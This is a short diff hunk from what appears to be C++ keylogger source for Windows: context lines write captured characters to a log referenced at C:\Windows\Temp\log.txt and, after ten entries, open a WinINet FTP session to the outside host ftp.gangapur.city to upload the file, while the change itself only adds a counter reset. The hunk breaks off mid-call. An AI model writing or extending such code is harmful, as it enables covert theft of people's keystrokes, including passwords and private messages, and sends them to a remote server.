@@ -49,6 +49,7 @@ int main()
                 default:write << "<<--Invalid Character-->>" <<endl;
                 //cout<< "file size is : "<<getfilesize("C:\\Windows\\Temp\\log.txt")<<endl;
                 if(i>=10){
+                        i=0;
                     //send file to ftp
                     HINTERNET internet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
                     HINTERNET ftpSession = InternetConnect(internet, "ftp.gangapur.city", INTERNET_DEFAULT_FTP_PORT,
